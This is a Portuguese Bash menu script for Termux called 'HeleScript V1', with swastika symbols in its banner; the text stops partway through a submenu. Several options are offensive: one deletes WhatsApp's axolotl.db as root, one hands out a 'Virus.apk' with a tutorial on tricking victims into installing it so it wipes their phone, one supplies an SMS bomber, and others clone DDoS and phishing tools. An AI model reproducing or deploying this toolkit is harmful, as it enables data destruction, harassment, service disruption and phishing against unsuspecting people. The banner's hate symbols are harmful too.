#!/bin/bash
clear
unset MENU_PRINCIPAL
#Abaixo umas funcao em shell Script
GRAFICO_OU_MENU(){
         echo -e "
       \033[1;36m =-=-=-=-=-=-=-=\033[0m
 \033[1;36m-=-=-=-=\033[0m \033[1;33mHeleScript:\033[0m \033[1;36m=\033[0m
 \033[1;36m=      =-=-=-=-=-=-=-=
 -
 =
 =
 -\033[0m"
}


                ANIMA_DA_AVA(){
echo -e '\033[1;36m=-=-=-=-=-=-=-=-=-=
=\033[0m \033[1;33mAVALIAÇÃO FINAL\033[0m \033[1;36m=
=-=-=-=-=-=-=-=-=-=\033[0m'
}

#CODIGO DE CORES, PARA PERSONALIZAR
COR_CINZA="\033[1;30m"
COR_VERMELHO="\033[0;31m"
COR_VERMELHO_CLARO="\033[1;31m"
COR_AZUL_ESCURO="\033[0;34m"
COR_AZUL_MARINHO="\033[1;34m"
COR_AMARELO="\033[1;33m"


#Abaixo os comandos que vai fazer a script só
#Parar de executar quando o usuario...
#escolher a opcão 27
while [[ $MENU_PRINCIPAL -ne 27 ]]
do

#Apagando as variaveis com unset
#Pois se n... pode fazer a script errar
#Na sua execução.

unset MENU_PRINCIPAL
unset NANO_ESTA
unset TOPO
unset COR_DO_TOPO
unset NICK_DO_USUARIO
unset WGET_ESTA
unset GIT_ESTA
unset MENU_CURSOS_TREINAMENTOS
unset RESP_UM
unset RESP_UM_OFC
unset RESP_DOIS
unset RESP_DOIS_OFC
unset RESP_TRES
unset RESP_TRES_OFC
unset AULA19_RESP2
unset AULA19_RESP1
unset ATIV_DA_AULA19
unset AVAL_FINAL_RESP1
unset AVAL_FINAL_RESP1_OFC
unset AVAL_FINAL_RESP2
unset AVAL_FINAL_RESP2_OFC
unset AVAL_FINAL_RESP3
unset AVAL_FINAL_RESP3_OFC
unset AVAL_FINAL_RESP4
unset AVAL_FINAL_RESP4_OFC
unset AVAL_FINAL_RESP5
unset AVAL_FINAL_RESP5_OFC
unset NOTA_FINAL_DO_CURSO
NOTA_FINAL_DO_CURSO=0
#Continuando a execução



clear
echo -e "
\033[1;36ml=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=l\033[0m
\033[1;36ml\033[0m             \033[1;33mUMBRELLѦ CORPᱰRѦTIᱰN\033[0m                \033[1;36ml\033[0m
\033[1;36ml=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=l\033[0m
\033[1;36ml\033[0m \033[1;31m卐           ─▄────▄▄▄▄▄▄▄────▄─             卐\033[0m \033[1;36ml\033[0m
\033[1;36ml\033[0m             \033[1;31m ▀▀▄─▄█████████▄─▄▀▀\033[0m                \033[1;36ml\033[0m
\033[1;36ml\033[0m             \033[1;31m ────██─▀███▀─██────\033[0m                \033[1;36ml\033[0m
\033[1;36ml\033[0m             \033[1;31m ──▄─▀████▀████▀─▄──\033[0m                \033[1;36ml\033[0m
\033[1;36ml\033[0m             \033[1;31m ▀█────██▀█▀██────█▀\033[0m                \033[1;36ml\033[0m
\033[1;36ml\033[0m                                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m                \033[1;31m HeleScript V1 \033[0m                  \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31m/-----------------------------\ \033[0m        \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m1\033[1;36m] Personalizar Termux\033[0m     \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m2\033[1;36m] Bugar Travas do Whats\033[0m   \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m3\033[1;36m] Obter um Virus em .apk\033[0m  \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m4\033[1;36m] Obter APP Sms Bomber\033[0m    \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m5\033[1;36m] Atualizar Repositórios\033[0m  \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m6\033[1;36m] Instalar Pack De DDOS\033[0m   \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m7\033[1;36m] Instalar Weeman\033[0m         \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m8\033[1;36m] Instalar Nmap\033[0m           \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m9\033[1;36m] Instalar Ps.ngrok\033[0m       \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m10\033[1;36m] Instalar Git\033[0m           \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m11\033[1;36m] Instalar Clang\033[0m         \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m12\033[1;36m] Instalar Tor\033[0m           \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m13\033[1;36m] Instalar Figlet\033[0m        \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m14\033[1;36m] Instalar Cmatrix\033[0m       \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m15\033[1;36m] Instalar Cowsay\033[0m        \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m16\033[1;36m] Instalar Python 3\033[0m      \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m17\033[1;36m] Instalar Python 2\033[0m      \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m18\033[1;36m] Instalar Wget\033[0m          \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m19\033[1;36m] Instalar Nano\033[0m          \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m20\033[1;36m] Instalar Php\033[0m           \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m21\033[1;36m] Instalar Ruby\033[0m          \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m22\033[1;36m] Instalar Perl\033[0m          \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m23\033[1;36m] Instalar Curl\033[0m          \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m24\033[1;36m] Cursos e Treinamentos\033[0m  \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m25\033[1;36m] Manual  \033[0m               \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m26\033[1;36m] Créditos\033[0m               \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m27\033[1;36m] Sair\033[0m                   \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31m\-----------------------------/\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m                                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m\033[1;31m 卐                ┌∩┐(◣_◢)┌∩┐                卐\033[0m \033[1;36ml\033[0m
\033[1;36m---------------------------------------------------\033[0m
"
read MENU_PRINCIPAL
clear
case "$MENU_PRINCIPAL" in

     1)
      #Opcao do menu de personalizar o termux
      #OBS:É PROIBIDO ALTERAR, OU COPIAR ESSA PARTE
      #DO PROGRAMA.
      ###########################
      #VERIFICANDO SE TEM O NANO#
      ###########################
      #O COMANDO which SERVE PRA VER SE DETERMINADO PROGRAMA ESTÁ INSTALADO.
      NANO_ESTA=$(which nano)
      if [[ -z "$NANO_ESTA" ]];then
       GRAFICO_OU_MENU
       echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o nano instalado, Volte ao menu principal e instale o nano\033[0m"
       echo
       echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
       read SEGUE
      else
      ####################
      #FAZENDO O PROCESSO#
      ####################
      #Procurando os arquivos
        cd;cd ..;cd usr;cd etc
      #Apagando/limpando arquivos
         rm -rf motd
	 rm -rf bash.bashrc
      #Criando arquivos (Agora vazio)
         touch motd;touch bash.bashrc
      #Gerando personalizacao
         echo "command_not_found_handle() {
    /data/data/com.termux/file/usr/libexec/termux/command-not-found "$1"
}

echo -e '" >> bash.bashrc
      #Criando arquivo vazio temporario, Para armazenar o topo.
         touch ARQUIVO_VAZIO
      #Interagindo com o usuario 1
         TEM_OUTRA_PART="s"
      while [[ $TEM_OUTRA_PART = "s" ]]
      do
        clear
        GRAFICO_OU_MENU
        echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mInsira o Desenho, Ou aquilo que vai ficar toda vez que vc entrar no termux:\033[0m"
        read TOPO
        #O desenho ou sla vai ficar no arquivo vazio
        echo "$TOPO" >> ARQUIVO_VAZIO
        clear
        GRAFICO_OU_MENU
        echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mDeseja colocar mais coisas [s/n]\033[0m"
        read TEM_OUTRA_PART
      done

      #Interagindo com o usuario 2
      #Cor do topo
      clear
      echo -e '
           \033[1;36m=-=-=-=-=-=-=-=
 =-=-=-=-=-=\033[0m\033[1;33mESCOLHA A COR\033[0m\033[1;36m=-=-=-=-=-=\033[0m
\033[1;36m -         =-=-=-=-=-=-=-=         -\033[0m
\033[1;36m =\033[0m  \033[1;32m[\033[0m1\033[0m\033[1;32m]\033[0m\033[1;31m Nenhuma\033[0m                    \033[1;36m=\033[0m
\033[1;36m -\033[0m  \033[1;32m[\033[0m\033[1;30m2\033[0m\033[1;32m]\033[0m \033[1;31mCinza\033[0m                     \033[1;36m -\033[0m
\033[1;36m =\033[0m  \033[1;32m[\033[0m\033[0;31m3\033[0m\033[1;32m]\033[0m \033[1;31mVermelho\033[0m                   \033[1;36m=\033[0m
\033[1;36m -\033[0m  \033[1;32m[\033[0m\033[1;31m4\033[0m\033[1;32m]\033[0m \033[1;31mVermelho Claro\033[0m             \033[1;36m-\033[0m
\033[1;36m =\033[0m  \033[1;32m[\033[0m\033[0;34m5\033[0m\033[1;32m]\033[0m \033[1;31mAzul Escuro\033[0m                \033[1;36m=\033[0m
\033[1;36m -\033[0m  \033[1;32m[\033[0m\033[1;34m6\033[0m\033[1;32m]\033[0m \033[1;31mAzul Marinho\033[0m               \033[1;36m-\033[0m
\033[1;36m =\033[0m  \033[1;32m[\033[0m\033[1;33m7\033[0m\033[1;32m]\033[0m \033[1;31mAmarelo\033[0m                    \033[1;36m=\033[0m
\033[1;36m -\033[0m                                 \033[1;36m-\033[0m
\033[1;36m =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33mDigite uma das opções:\033[0m'
      read COR_DO_TOPO
      clear
      #Gerando personalizacao
      if [[ "$COR_DO_TOPO" -eq 1 ]];then
        cat ARQUIVO_VAZIO >> bash.bashrc
        echo "'" >> bash.bashrc
      else
       if [[ "$COR_DO_TOPO" -eq 2 ]];then
          echo "$COR_CINZA" >> bash.bashrc
          cat ARQUIVO_VAZIO >> bash.bashrc
          echo "\033[0m'" >> bash.bashrc
       else
        if [[ "$COR_DO_TOPO" -eq 3 ]];then
          echo "$COR_VERMELHO" >> bash.bashrc
          cat ARQUIVO_VAZIO >> bash.bashrc
          echo "\033[0m'" >> bash.bashrc
        else
         if  [[ "$COR_DO_TOPO" -eq 4 ]];then
            echo "$COR_VERMELHO_CLARO" >> bash.bashrc
            cat ARQUIVO_VAZIO >> bash.bashrc
            echo "\033[0m'" >> bash.bashrc
         else

          if [[ "$COR_DO_TOPO" -eq 5 ]];then
             echo "$COR_AZUL_ESCURO" >> bash.bashrc
             cat ARQUIVO_VAZIO >> bash.bashrc
             echo "\033[0m'" >> bash.bashrc
          else
           if [[ "$COR_DO_TOPO" -eq 6 ]];then
              echo "$COR_AZUL_MARINHO" >> bash.bashrc
              cat ARQUIVO_VAZIO >> bash.bashrc
              echo "\033[0m'" >> bash.bashrc
           else
            if [[ "$COR_DO_TOPO" -eq 7 ]];then
               echo "$COR_AMARELO" >> bash.bashrc
               cat ARQUIVO_VAZIO >> bash.bashrc
               echo "\033[0m'" >> bash.bashrc
            fi
           fi
          fi
         fi
        fi
       fi
      fi
      #parte 2: A parte aonde fica
      #os seus dados. Aquela aonde vc coloca...
      #se é um usuário que tem root ou não...
         #Interagindo com o usuario 3
         GRAFICO_OU_MENU
         echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼\033[0m \033[1;34mDigite o seu nome/Nick:\033[0m"
         read NICK_DO_USUARIO
      #Personalizando a parte 2
         echo "PS1='\033[1;31m$NICK_DO_USUARIO@TeamUmbrella:\033[0m~$ '" >> bash.bashrc
      #Apagando o arquivo temporario
         rm -rf ARQUIVO_VAZIO
      #Voltando pra pasta da script
         cd;cd HeleV1
      #Interagindo com o usuario 4
         clear
         GRAFICO_OU_MENU
         echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼\033[0m \033[1;34mTermux Personalizado Com Sucesso, Agora Toda Vez Que Vc Criar Uma Nova Aba no Termux... irá aparecer a Personalização! \033[0m"
         echo
         echo -e "\033[1;33mAPERTE ENTER PARA VOLTAR AO MENU PRINCIPAL: \033[0m"
         read SEGUE
      fi;;
     2)
       #Opcao do menu de bugar travas
          #Entrando na pasta e apagando o arquivo
          cd;su -y;cd;cd /data/data/com.whatsapp/databases;rm -rf axolotl.db;cd;cd HeleV1
          echo
          echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
          read SEGUE
          clear
          GRAFICO_OU_MENU
          echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m \033[1;34mArquivo Apagado, Se o seu WhatsApp estiver aberto então feche ele da janela dos recentes e entre novamente que o codigo ira upar e as travas cairão bugadas!\033[0m"
          echo
          echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
          read SEGUE;;
     3)
      #Obter/Baixar um virus em .apk
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[1;34mMOVENDO PRA PASTA DE DOWNLOADS...\033[0m"
              echo
	      cp -i Virus.apk /data/data/com.termux/files/home/storage/downloads
              sleep 4
              clear;echo
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPRONTO, VERIFIQUE SE O APP ESTÁ NA PASTA DE DOWNLOADS!\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
              clear
              echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m
\033[1;36ml\033[0m  \033[1;33m TUTORIAL\033[0m    \033[1;36ml\033[0m
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m"
              echo -e "
\033[1;33m1) QUAL A FUNÇÃO DO APP:\033[0m

\033[1;31mApagar tudo do celular da pessoa. Inclusive não tenho certeza se ele apaga os dados do cartão de memória, Porém eu(Helexiel) já formatei o celular Android do meu amigo(Sem querer) Com esse app. E vale destacar que o app apagou os dados do cartão de memória dele.\033[0m

\033[1;33mOBS:\033[0m\033[1;31mEsse vírus/app só funciona pra Android.\033[0m

\033[1;33m2) COMO UTILIZAR:\033[0m

\033[1;31mVocê tem que enviar o app pra vítima, Dizendo que é um app pra hackear redes Wi-fi, Pois o nome do app e a foto dele é fingindo ser pra hackear realmente wi-fi.

Ou use outra mentira pra fazer com que a pessoa instale o app.

Vale destacar aqui que a pessoa tem que ser muito burra pra cair nessa engenharia social, Pois a pessoa tem que permitir que o app tenha poder de administrador.\033[0m

\033[1;33m3) AONDE ESTÁ O APP:\033[0m

\033[1;31mVerifique se ele está na sua pasta de downloads.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;;
     4)
      #Obter/Baixar sms bomber
              echo
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mMOVENDO PRA PASTA DE DOWNLOADS...\033[0m"
              echo
	      cp -i Smsbomber.apk /data/data/com.termux/files/home/storage/downloads
              sleep 4
              clear;echo
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPRONTO, VERIFIQUE SE O APP ESTÁ NA PASTA DE DOWNLOADS!\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
              clear
              echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m
\033[1;36ml\033[0m  \033[1;33m TUTORIAL\033[0m    \033[1;36ml\033[0m
\033[1;36m=-=-=-=-=-=-=-=-=\033[0m"
              echo -e "
\033[1;33m1) QUAL A FUNÇÃO DO APP:\033[0m

\033[1;31mEnviar vários SMS, Ou seja bombardear a pessoa com SMS... Você pode usar isso pra trolar um amigo seu etc...\033[0m

\033[1;33mOBS:\033[0m\033[1;31mEsse app só funciona pra Android.\033[0m

\033[1;33m2) SOBRE OS SMS:\033[0m

\033[1;31mBom, Antes de tudo eu gostaria de falar que os sms são pagos, Ou seja gasta os seus créditos. E pra resolver esse problema... eu recomendo você ter uma promoção pra SMS.

Por exemplo, Na maioria das operadoras, Você paga determinada taxa e você tem SMS ilimitado pra qualquer operadora.\033[0m

\033[1;33m3) COMO UTILIZAR:\033[0m

\033[1;31mEm\033[0m \033[1;32mtype a name or number\033[0m\033[1;31m, Você coloca o número da pessoa.

Já em\033[0m \033[1;32mtype a sms\033[0m\033[1;31m, você coloca a mensagem que vai ser enviada para a vítima/Pessoa.

Agora em\033[0m \033[1;32mof text\033[0m \033[1;31mvai ser colocado quantas vezes essa mensagem vai ser enviada para determinado número.

E por último em\033[0m \033[1;32mdelay\033[0m\033[1;31m, Você coloca o tempo pra cada sms. Ou seja em quantos segundos vai ser enviado o próximo.\033[0m

\033[1;33mOBS:\033[0m\033[1;31mEu recomendo vc colocar 2.\033[0m

\033[1;33m4) AONDE ESTÁ O APP:\033[0m

\033[1;31mVerifique se ele está na sua pasta de downloads.\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;;
     5)
     #Atualizar repositorios
         GRAFICO_OU_MENU
         echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mAtualizando... Aguarde e quando terminar vc ira ser jogado pro menu principal.\033[0m"
         sleep 3;apt update;apt upgrade -y;sleep 1;clear;;
     6)
     #Pack de ddos/dos
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
             GRAFICO_OU_MENU
             echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando, Obs: isso pode demorar!\033[0m"
             sleep 3;echo
	     #Voltando a pasta principal do termux, Para assim as scripts ficarem nela.
	     cd
	     #Continuando...
             echo -e "\033[1;31mInstalando a script DDos-Attack\033[0m"
             sleep 2
             git clone https://github.com/Ha3MrX/DDos-Attack
             echo
             echo -e "\033[1;31mInstalando a script hammer\033[0m"
             sleep 2
             git clone https://github.com/cyweb/hammer
             echo
             echo -e "\033[1;31mInstalando a script xerxes\033[0m"
             sleep 2
             git clone https://github.com/XCHADXFAQ77X/XERXES
             echo
             echo -e "\033[1;31mIstalando a script torshammer\033[0m"
             sleep 2
             git clone https://github.com/dotfighter/torshammer
             clear
             GRAFICO_OU_MENU
             echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPronto, Todas as scripts de D.D.O.S/D.O.S já foram instaladas, e estão prontas para uso!\033[0m"
             echo
             echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
             read SEGUE
	     #Voltando pra pasta da Script
	     cd HeleV1
           fi;;
     7)
     #Instalar weeman
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
	      cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando a script para pishing weeman... pfvr aguarde!\033[0m"
              sleep 4
              git clone https://github.com/evait-security/weeman
              cd weeman;chmod +x *;cd;clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mA script está pronta para uso, Caso Ñ saiba como utilizar a mesma... leia o manual no menu principal\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV1
           fi;;
     8)
     #Instalar nmap
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
	      cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando o nmap... pfvr aguarde!\033[0m"
              sleep 3
              git clone https://github.com/nmap/nmap
              clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPronto, A script está pronta para uso!\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV1
           fi;;
     9)
     #Instalar a ferramenta ps.ngrok
        ####################################
        #VERIFICANDO SE TEM O GIT INSTALADO#
        ####################################
           GIT_ESTA=$(which git)
           if [[ -z "$GIT_ESTA" ]];then
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mErro: Esta opcao requer o git instalado, Volte ao menu principal e instale o git\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE
           else
        ############################
        #CASO O USUARIO TENHA O GIT#
        ############################
              GRAFICO_OU_MENU
	      cd
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mBaixando a ferramenta Ps.ngrok, Pfvr aguarde!\033[0m"
              sleep 3
              git clone https://github.com/PSecurity/ps.ngrok
              cd ps.ngrok;chmod +x * ngrok;mv ngrok /data/data/com.termux/files/home;cd;sleep 3;clear
              GRAFICO_OU_MENU
              echo -e "\033[1;36m =-=-=-=-@▄―⃥⃩ͦ᷵‾⃫ࣱࣨᷓᡁ⃪॑ͦ▰⃪╼ \033[0m\033[1;34mPronto, A script está pronta para uso!\033[0m"
              echo
              echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
              read SEGUE;cd HeleV1
           fi;;
     10)
      #Instalar git
      pkg install git -y;;
     11)
      #Instalar clang
      pkg install clang -y;;
     12)
      #Instalar tor
      pkg install tor -y;;
     13)
      #Instalar figlet
      pkg installl figlet -y;;
     14)
      #Instalar cmatrix
      pkg install cmatrix -y;;
     15)
      #Instalar cowsay
      pkg install cowsay -y;;
     16)
      #Instalar python3
      pkg install python3 -y;;
     17)
      #Instalar python2
      pkg install python2 -y;;
     18)
      #Instalar wget
      pkg install wget -y;;
     19)
      #Instalar editor de texto nano
      pkg install nano -y;;
     20)
      #Instalar php
      pkg install php -y;;
     21)
      #Instalar ruby
      pkg install ruby -y;;
     22)
      #Instaslar perl
      pkg install perl -y;;
     23)
      #Instalar curl
      pkg install curl -y;;
     24)
      #Cursos e Treinamentos
      while [[ $MENU_CURSOS_TREINAMENTOS -ne 23 ]]
      do
      clear
          echo -e '
                    ‎╮╰╮╮▕╲╰╮╭╯╱▏╭╭╭╭
                    ╰╰╮╰╭╱▔▔▔▔╲╮╯╭╯
                    ┏━┓┏┫╭▅╲╱▅╮┣┓╭║║║
                    ╰┳╯╰┫┗━╭╮━┛┣╯╯╚╬╝
                    ╭┻╮╱╰╮╰━━╯╭╯╲┊ ║
                    ╰┳┫▔╲╰┳━━┳╯╱▔┊ ║
                    ┈┃╰━━╲▕╲╱▏╱━━━┬╨╮
                    ┈╰━━╮┊▕╱╲▏┊╭━━┴╥╯

    \033[1;31m  O QUE DESEJA APRENDER HOJE MEU CARO INFECTADO ?\033[0m

\033[1;36m/-------------------------\   /---------------------------------\ \033[0m
\033[1;36ml\033[0m     \033[1;33mTUTORIAIS/AULAS\033[0m     \033[1;36ml   l\033[0m  \033[1;33mINTRO A LÓGICA DE PROGRAMAÇÃO\033[0m \033[1;36m l\033[0m
\033[1;36m---------------------------   -----------------------------------\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m1\033[1;32m]\033[0m \033[1;31mExplicações Básicas\033[0m \033[1;36ml   l\033[0m \033[1;32m[\033[0m10\033[1;32m]\033[0m \033[1;31mOq é lógica de Programação\033[0m \033[1;36ml\033[0m
\033[1;36ml\033[0m                         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
\033[1;36ml\033[0m \033[1;32m[\033[0m2\033[1;32m]\033[0m \033[1;31mIntro a Segurança\033[0m   \033[1;36ml   l\033[0m \033[1;32m[\033[0m11\033[1;32m]\033[0m \033[1;31mDado e Informação\033[0m          \033[1;36ml\033[0m
\033[1;36ml\033[0m    \033[1;31m Na Internet\033[0m         \033[1;36ml   l\033[0m                                 \033[1;36ml\033[0m
